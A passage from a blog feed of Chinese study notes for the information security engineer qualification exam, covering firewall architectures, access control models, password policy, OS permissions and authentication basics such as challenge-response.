id="数据库防火墙技术">数据库防火墙技术</h4><ul><li>核心技术：基于协议深度分析和虚拟补丁技术</li><li>访问控制：监控风险行为，阻断违规SQL操作（如越权查询）</li><li>虚拟补丁：<ul><li>原理：在数据库外部建立安全屏蔽层，拦截可疑会话</li><li>优势：无需安装厂商补丁，避免服务中断（如银行系统需7×24小时运行）</li><li>典型案例：解决Oracle数据库补丁安装需重启的问题</li></ul></li></ul><h4 id="工控防火墙">工控防火墙</h4><ul><li>防护对象：保护啤酒厂、轮胎生产线等工业控制系统</li><li>协议支持：深度解析Modbus TCP、IEC61850、OPC等工控协议</li><li>特殊要求：<ul><li>环境适应性：耐受工厂高温、粉尘等恶劣条件</li><li>实时性：毫秒级响应</li></ul></li></ul><h2 id="防火墙防御体系结构类型">防火墙防御体系结构类型</h2><h3 id="基于双宿主主机防火墙结构">基于双宿主主机防火墙结构</h3><img src="https://image.icewindy.cn/2025/08/a06e1dc8de8c0154fca59a38b9ef5760.png" alt="image-20250807115924262" style="zoom:50%;" /><ul><li>基本构成：由至少配备两块网卡的主机系统组成，分别连接内部网络和外部网络</li><li>工作原理：内外网通过不同网卡连接，IP数据包需经安全检查模块验证，合法则转发，非法则阻断</li><li>安全特性：内外网络通信<strong>完全受控于双宿主主机</strong>，但安全性相对较低</li><li>典型特征：采用单台多网卡设备实现网络隔离，是<strong>最基础的防火墙结构</strong></li></ul><h3 id="基于代理型防火墙结构">基于代理型防火墙结构</h3><img src="https://image.icewindy.cn/2025/08/22c0dac42c876e409f4bec20bec978ee.png" alt="image-20250807120114727" style="zoom:67%;" /><ul><li>系统组成：由代理服务器主机和过滤路由器共同构成安全边界</li><li>访问规则：<ul><li>允许内部主机直接发起对外连接</li><li>外部主机只能与代理主机建立连接</li><li>所有<strong>外部操作必须经过代理主机中转</strong></li></ul></li><li>安全机制：代理主机需具备全面安全防护，承担流量检查和中转职能</li><li>优劣分析：<ul><li>优点：比双宿主结构提供更强安全保障，操作更简便</li><li>缺点：代理主机被攻破后，攻击者可获取内部网络全部信息</li></ul></li></ul><h3 id="基于屏蔽子网的防火墙结构">基于屏蔽子网的防火墙结构</h3><img src="https://image.icewindy.cn/2025/08/942652598e209a00f1fd90b4fe6902b9.png" alt="image-20250807120414757" style="zoom:67%;" /><ul><li>架构设计：在代理型结构基础上增加周边网络，形成内外网双重隔离</li><li>核心组件：<ul><li>两个过滤路由器（A和B）</li><li>代理服务器主机（堡垒主机）</li><li>被屏蔽子网</li></ul></li><li>安全机制：<ul><li>路由器A过滤外网对屏蔽子网的访问</li><li>路由器B过滤屏蔽子网对内网的访问</li><li>所有访问必须经代理服务器检查认证</li></ul></li><li>攻防优势：<strong>即使堡垒主机被攻破，攻击者仍无法直接访问内网信息</strong></li><li>部署特点：<ul><li>公开服务器置于屏蔽子网</li><li>内外网采用不同网段隔离</li><li>需经过三层路由才能实现跨网段访问</li></ul></li><li>系统评价：<ul><li>优点：三种结构中安全级别最高</li><li>缺点：设备成本高，配置复杂度大</li></ul></li><li>结构对比：<ul><li>设备数量：双宿主（1台）→代理型（2台）→屏蔽子网（3台）</li><li>安全性：依次增强，屏蔽子网结构防护能力最强</li><li>典型特征：通过增加网络隔离层和设备数量提升安全性</li></ul></li></ul><h2 id="防火墙应用">防火墙应用</h2><h3 id="安全功能指标">安全功能指标</h3><img src="https://image.icewindy.cn/2025/08/1a7f4afd2b09543d11a9e83e13bdb6f9.png" alt="image-20250807122812989" style="zoom:50%;" /><h3 id="性能指标">性能指标</h3><img src="https://image.icewindy.cn/2025/08/b26540c67380fc3dd18148cdb1dee2f6.png" alt="image-20250807122904513" style="zoom:50%;" /><h3 id="防火墙部署">防火墙部署</h3><ol><li>划分区域<ul><li>典型区域: Trust（信任区）、Untrust（非信任区）、DMZ（隔离区）</li></ul></li><li>设控制点<ul><li>实现方式: 通过防火墙设备实现区域间访问控制</li></ul></li><li>定策略<ul><li>策略内容: 明确各区域间的访问权限（permit/deny）</li></ul></li><li>选技术<ul><li>实际选择: 99%项目采用双宿主机结构，屏蔽子网理论性强但实施复杂</li></ul></li><li>配策略<ul><li>配置方法: 通过ACL等机制实现前期制定的安全策略</li></ul></li><li>测试验证<ul><li>验证方法: 通过ping等基础网络测试验证策略有效性</li></ul></li><li>运维维护<ul><li>持续工作: 包括策略调整、性能监控等日常运维</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（7）：访问控制</title>
      <link href="/2025/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%887%EF%BC%89%EF%BC%9A%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
      <url>/2025/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%887%EF%BC%89%EF%BC%9A%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="访问控制概述">访问控制概述</h2><h3 id="访问控制定义">访问控制定义</h3><ul><li>核心要素：包含主体（用户/进程/应用程序）、客体（文件/服务/数据）、授权（访问方式）和控制（访问决策）</li><li>授权机制：明确访问者对资源对象的操作权限，如文件可读/写/删除/追加，邮件服务可接收/发送</li><li>控制决策：包含三种基本判断结果：拒绝访问、授权许可、禁止操作</li></ul><h3 id="访问控制目标">访问控制目标</h3><ol><li>通过认证机制防止非法用户进入系统</li><li>通过权限管理阻止合法用户越权操作</li></ol><h3 id="实现访问控制目标">实现访问控制目标</h3><ul><li>实现流程：<ul><li>身份认证（前置条件）</li><li>权限授予（核心环节）</li><li>审计监控（事后保障）</li></ul></li><li>协同机制：与认证、审计构成三位一体安全体系：<ul><li>认证解决&quot;你是谁&quot;</li><li>访问控制解决&quot;你能做什么&quot;</li><li>审计记录&quot;你做了什么&quot;</li></ul></li></ul><p><img src="https://image.icewindy.cn/2025/08/b95f803e76f6fa579f69f1b05a3e2a92.png" alt="image-20250805152741677"></p><h3 id="访问控制模型">访问控制模型</h3><ul><li>访问控制的组成要素<ul><li>主体（Subject，操作的实施者）</li><li>客体（Object，被操作的对象）</li><li>参考监视器（Reference Monitor，访问控制的决策单元和执行单元的集合体）</li><li>访问控制数据库（记录访问权限及其访问方式，提供访问控制决策判断的依据）</li><li>审计库（存储主体访问客体的操作信息，如访问成功、失败等）</li></ul></li><li>常见访问控制模型<ul><li>基础模型（<strong>重点</strong>）：操作系统/数据库常用<ul><li>自主访问控制（DAC）：权限由资源所有者决定</li><li>强制访问控制（MAC）：多级安全系统采用，权限由系统强制规定</li><li>基于角色访问控制（RBAC）：按职务角色分配权限（如管理员/普通用户）</li></ul></li><li>扩展模型（理解应用）：<ul><li>基于属性(ABAC)：利用用户属性控制（如性别限制厕所访问）</li><li>基于地理位置：移动APP位置授权</li><li>基于时间：实现时段限制（如上班时间禁止视频流量）</li><li>基于行为：上网行为管理（拦截非法网站访问）</li><li>基于使用：用于知识产权保护、隐私保护、敏感信息安全限制（每次使用需重新授权）</li></ul></li></ul></li></ul><h2 id="访问控制模型">访问控制模型</h2><h3 id="自主访问控制-dac">自主访问控制（DAC）</h3><img src="https://image.icewindy.cn/2025/08/f64f4174e32ef8612a87973f58ba8c8c.png" alt="image-20250805153750592" style="zoom:50%;" /><ul><li>定义: 指客体的所有者<strong>按照自己的安全策略授予系统中的其他用户对其的访问权</strong>。</li><li>实现方式:<ul><li>基于行的自主访问控制：能力表、前缀表、口令</li><li>基于列的自主访问控制：保护位、访问控制列表(ACL)</li></ul></li><li>行/列区别:<ul><li>基于行：如张三能访问网页、数据库、视频</li><li>基于列：如Web服务中张三可访问，李四不可访问</li></ul></li><li>特点:<ul><li>优点: 用户可自行设置权限，机制简单灵活</li><li>缺点: 依赖用户安全意识和技能，无法满足高安全需求</li></ul></li></ul><h3 id="强制访问控制-mac">强制访问控制（MAC）</h3><ul><li>定义: 根据主体和客体的安全属性，<strong>强制控制</strong>访问行为。</li><li>访问条件:<ul><li>进程安全级别 ≥ 客体安全级别</li><li>进程范畴 ⊇ 文件范畴</li></ul></li><li>关键要素:<ul><li>安全级别: 如绝密/机密/秘密等级</li><li>范畴: 分类标签(如部门、项目等)</li></ul></li><li>对比DAC:<ul><li>严格性: 系统强制实施，非用户自主设置</li><li>适用场景: 政府/军事/金融等高安全领域</li></ul></li></ul><h3 id="基于角色的访问控制-rbac">基于角色的访问控制（RBAC）</h3><p><img src="https://image.icewindy.cn/2025/08/83008303428bbfa67a1e58f763b2ca0a.png" alt="image-20250805154156747"></p><ul><li>核心要素：用户(U)、角色®（类似用户分组）、会话(S)、权限§</li><li>工作原理：权限→角色→用户三级关联</li><li>优势:<ul><li>管理效率: 通过角色批量管理用户权限</li><li>最小特权: 可精确控制权限范围</li><li>职责分离: 不同角色承担不同任务</li></ul></li></ul><h3 id="基于属性的访问控制-abac">基于属性的访问控制（ABAC）</h3><ul><li>决策要素:<ul><li>主体属性(如年龄、职位)</li><li>客体属性(如文件密级)</li><li>环境条件(如时间、位置)</li><li>访问策略</li></ul></li><li>典型示例:<ul><li>R18影片</li><li>工作时间外禁止访问财务系统</li></ul></li><li>特点:<ul><li>灵活性: 支持多维度条件组合</li><li>动态性: 可实时响应环境变化</li></ul></li></ul><h2 id="访问控制策略">访问控制策略</h2><ul><li>核心功能：规定访问资源的权限，防止资源损失、泄密或非法使用</li><li>设计要求：<ul><li>安全需求区分：需区分内部/外部用户的不同权限需求</li><li>信息确认：需明确通信端口号、IP地址等应用相关信息</li><li>传播授权：需制定信息安全级别和分类标准</li><li>策略一致性：不同系统的访问控制策略需保持统一</li><li>合规要求：需符合数据保护法规和合同义务</li><li>权限维护：需建立权限更新机制</li></ul></li><li>规则制定原则：<ul><li>白名单机制：必须采用&quot;未经明确允许的都是禁止的&quot;原则（安全性更高）</li><li>变更记录：需记录信息标记和用户许可的变更情况</li><li>审批流程：新规则颁布前需管理人员批准</li></ul></li></ul><h2 id="访问控制规则">访问控制规则</h2><ul><li>规则本质：访问约束条件集合</li><li>主要类型：<ul><li>身份验证：基于用户身份（如用户名）的访问控制</li><li>角色分配：基于用户组（如管理员组、访客组）的访问控制</li><li>地址过滤：基于IP/MAC地址或域名的访问控制</li><li>时间限制：基于时间段的访问控制</li><li>异常防护：基于<strong>异常事件</strong>（如3次登录失败后冻结账户）</li><li>负载均衡：基于<strong>服务数量</strong>（达到阈值时拒绝新请求）</li></ul></li></ul><h2 id="访问控制过程">访问控制过程</h2><ul><li>实施目的：保护系统资产，防止非法访问和越权操作</li><li>实施步骤：<ul><li>明确资产：明确需保护的网络设备和服务</li><li>分析需求：评估资产的CIA需求（机密性、完整性、可用性）</li><li>制定策略：确定访问规则和权限分配方案</li><li>实施控制：配置身份认证系统和访问授权</li><li>运行维护：持续监控和调整访问策略</li></ul></li></ul><h2 id="访问控制安全管理">访问控制安全管理</h2><ol><li>最小特权管理：每个用户仅拥有完成任务所需的最小权限集<ul><li>特权分配原则：按需使用</li></ul></li><li>用户访问管理<ul><li>全周期管理：<ul><li>用户登记 → 权限分配 → 访问记录 → 权限监测 → 权限取消 → 用户撤销</li><li>管理重点：建立完整的用户权限生命周期管理流程</li></ul></li></ul></li><li>口令安全管理<ul><li>设置规范：<ul><li>复杂度：至少8字符，包含大小写字母、数字和特殊字符</li><li>唯一性：禁止使用与账号相同的口令</li><li>默认防护：必须更换系统默认口令</li></ul></li><li>使用管理：<ul><li>限制登录次数（建议3次）</li><li>禁止账号/口令共享</li><li>禁止明文传输口令</li><li>口令文件需加密，仅超级用户可读</li></ul></li><li>更新机制：<ul><li>时效性：定期强制修改口令</li><li>历史检查：禁止重用近期口令</li></ul></li><li>安全检查：<ul><li>定期使用破解工具检测弱口令/空口令</li></ul></li></ul></li></ol><h2 id="访问控制产品">访问控制产品</h2><h3 id="4a系统">4A系统</h3><ul><li>核心概念: 4A指认证(Authentication)、授权(Authorization)、账号(Account)、审计(Audit)</li><li>平台特性:<ul><li>中文名称为统一安全管理平台</li><li>集中提供账号管理、认证服务、授权控制和审计功能</li><li>采用基于角色的访问控制(RBAC)方法便于账号授权管理</li></ul></li><li>技术特点:<ul><li>集成访问控制机制和认证功能</li><li>提供多种访问控制服务</li><li>重点掌握4A的英文缩写和中文全称</li></ul></li></ul><h3 id="安全网关">安全网关</h3><ul><li>核心功能：对网络通信连接服务进行访问控制</li><li>典型产品:<ul><li>防火墙</li><li>统一威胁管理(UTM)</li><li>下一代防火墙(NGFW)</li></ul></li></ul><h3 id="系统安全增强">系统安全增强</h3><ul><li>核心技术: 采用强制访问控制(MAC)技术</li><li>防护对象:<ul><li>操作系统安全增强(如SELinux)</li><li>数据库系统安全防护</li></ul></li><li>主要目的: 防止特权滥用</li><li>典型应用:<ul><li>Linux的SELinux</li><li>Windows操作系统加固</li></ul></li></ul><h2 id="访问控制技术应用">访问控制技术应用</h2><ul><li>物理访问控制:<ul><li>门禁系统</li><li>个人证件(人脸识别/指纹识别)</li><li>物理安全区域划分</li></ul></li><li>网络访问控制:<ul><li>网络接入控制(需认证上网)</li><li>网络通信连接控制(出口防火墙过滤)</li><li>网络区域划分(如校园网分区)</li><li>网络路由控制</li><li>网络节点控制</li></ul></li><li>操作系统访问控制:<ul><li>文件读写控制(自主访问控制)</li><li>进程/内存访问控制(强制访问控制)</li></ul></li><li>数据库访问控制:<ul><li>数据库表创建权限</li><li>数据生成与分发控制</li></ul></li><li>应用系统访问控制:<ul><li>业务操作权限控制</li><li>业务系统文件读取权限</li></ul></li></ul><h3 id="unix-linux系统-重点">UNIX/Linux系统（重点）</h3><p><img src="https://image.icewindy.cn/2025/08/0a101ed4f59e0f92ca94e091f00afb30.png" alt="image-20250805175933865"></p><ul><li>权限表示:<ul><li>10位表示法：1位文件类型+9位权限(3组rwx)</li><li>文件类型标识：<ul><li>-：普通文件</li><li>d：目录文件</li><li>l：链接文件</li><li>b：设备文件</li><li>p：管道文件</li></ul></li></ul></li><li>权限分组:<ul><li>用户权限(前3位)</li><li>用户组权限(中3位)</li><li>其他用户权限(后3位)</li></ul></li><li>权限转换:<ul><li>字符表示：r(读)、w(写)、x(执行)</li><li>数字表示：r=4、w=2、x=1</li><li>示例：rw-r–r--=644，r-xr-x—=550</li></ul></li></ul><h3 id="windows系统">Windows系统</h3><p><img src="https://image.icewindy.cn/2025/08/2bb51a9df7b6174527c9034ec5328805.png" alt="image-20250805180245045"></p><ul><li>Windows用户登录到系统时，WinLogon进程为用户创建访问令牌。访问令牌包含用户及所属组的SID，作为用户的身份标识</li><li>访问控制列表:<ul><li><strong>DACL(自主访问控制列表)</strong>：定义访问权限</li><li><strong>SACL(系统访问控制列表)</strong>：定义审计范围</li></ul></li><li>访问流程:<ul><li>用户进程→Win32子系统→核心SRM</li><li>SRM比较访问令牌与DACL</li><li>检查SACL确定是否需要审计</li></ul></li><li>技术特点:<ul><li>文件访问采用自主访问控制</li><li>审计功能与SACL关联</li></ul></li></ul><h3 id="iis-ftp">IIS/FTP</h3><ul><li>访问方式:<ul><li>匿名访问(无需认证)</li><li>用户名/密码认证</li></ul></li><li>目录权限:<ul><li>读取=下载权限</li><li>写入=上传权限</li><li>对所有FTP用户生效</li></ul></li><li>日志记录: 可配置访问日志记录</li></ul><h3 id="其他访问控制应用">其他访问控制应用</h3><ul><li><p>网络通信连接控制</p><p><img src="https://image.icewindy.cn/2025/08/662da2d71afc1386c94ad4fde48f95d1.png" alt="image-20250805180609910"></p><ul><li>实现设备: 防火墙、路由器、网关</li><li>部署位置: 网络连接处</li><li>控制原理: 只有符合规则的通信才被允许</li></ul></li><li><p>基于VLAN的网络隔离</p><ul><li>划分依据: 按功能/业务划分</li><li>访问控制: 不同VLAN间需配置互访策略</li></ul></li><li><p>Web服务访问控制</p><ul><li>基本控制流程：</li></ul><img src="https://image.icewindy.cn/2025/08/483c82423d853849dda1d4af50ce153c.png" alt="image-20250805180745030" style="zoom:50%;" /><ul><li><p>控制层级:</p><ul><li>IP/DNS过滤</li><li>Web用户认证</li><li>文件系统权限</li><li>数据库权限</li></ul></li><li><p>访问流程: 逐级检查，全部通过才授权访问</p></li><li><p>典型应用:</p><ul><li>前端网页内容控制</li><li>后台数据库访问控制</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（6）：认证技术</title>
      <link href="/2025/08/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%886%EF%BC%89%EF%BC%9A%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/"/>
      <url>/2025/08/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%886%EF%BC%89%EF%BC%9A%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="认证技术基础与原理">认证技术基础与原理</h2><h3 id="认证基础">认证基础</h3><ul><li><p>组成要素：认证技术由**标识(Identification)和鉴别(Authentication)**两部分组成</p></li><li><p>标识：</p><ul><li>定义：标识是实体对象的身份标志，如QQ号、用户名等</li><li>特性：<ul><li>唯一性：确保实体可被唯一识别</li><li>强关联：与实体存在不可分割的绑定关系</li></ul></li><li>表现形式：通常由名称和标识ID组成，通过唯一标识符代表特定实体</li></ul></li><li><p>鉴别：</p><ul><li><p>定义：利用数字化凭证对实体声称属性进行验证的过程</p></li><li><p>常见凭证类型：</p><ul><li><strong>知识凭证</strong>：如密码&quot;123456&quot;等用户知道的秘密</li><li><strong>持有凭证</strong>：如UK(USB Key)等物理设备</li><li><strong>生物特征</strong>：指纹、虹膜等生理特征</li><li><strong>行为特征</strong>：键盘敲击力度、步态等行为模式</li></ul></li><li><p>认证示意图：展示实体间通过输入凭证进行验证的交互过程</p><p><img src="https://image.icewindy.cn/2025/08/e06652f73470f9ccaf63c5dab1c19143.png" alt="image-20250804150016430"></p></li></ul></li></ul><h3 id="认证原理">认证原理</h3><ul><li>基本构成：<ul><li>验证对象：需要认证的实体(客户端/声称者)</li><li>鉴别实体：进行验证的实体(服务端/验证者)</li><li>认证协议：双方通信的规则和流程</li></ul></li><li>认证技术发展：<ul><li>单点登录(SSO)：一次认证访问多系统</li><li>人机识别认证：如12306验证码</li><li>多因素认证：组合多种鉴别方式</li><li>行为鉴别技术：基于风险动态调整</li><li>FIDO快速认证：基于公钥加密的强认证方案</li></ul></li></ul><h3 id="认证分类">认证分类</h3><ul><li><p>单向认证：验证者对声称者进行单方面鉴别，声称者不需要识别验证者身份</p><ul><li><p>核心分类：<strong>基于共享秘密和基于挑战响应</strong></p></li><li><p>基于共享秘密</p><ul><li><p>基本要素：</p><ul><li>共享密钥：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿为双方预先共享的秘密（如密码&quot;123&quot;）</li><li>身份标识：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">ID_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿表示实体A的唯一标识（如用户名&quot;张三&quot;）</li></ul></li><li><p>认证流程：</p><ul><li>声称者A发送<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(ID_A, K_{AB})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿给验证者B</li><li>B核对﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">ID_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿对应的﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿是否正确</li><li>匹配则认证通过，否则失败</li></ul></li><li><p>安全缺陷：直接传输密钥可能被中间人截获（如明文传输密码&quot;123&quot;）</p></li><li><p>符号对应：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">ID_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿：实际应用中的用户名（如&quot;张三&quot;）</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>A</mi><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿：共享密码或密钥（如&quot;123&quot;）</li></ul></li></ul></li><li><p>基于挑战响应</p><ul><li>核心改进：通过随机数挑战避免密钥直接传输</li><li>流程要素：<ul><li>挑战随机数：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">R_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿由验证者B生成</li></ul></li><li>身份标识：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><msub><mi>D</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">ID_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿和﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><msub><mi>D</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">ID_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" 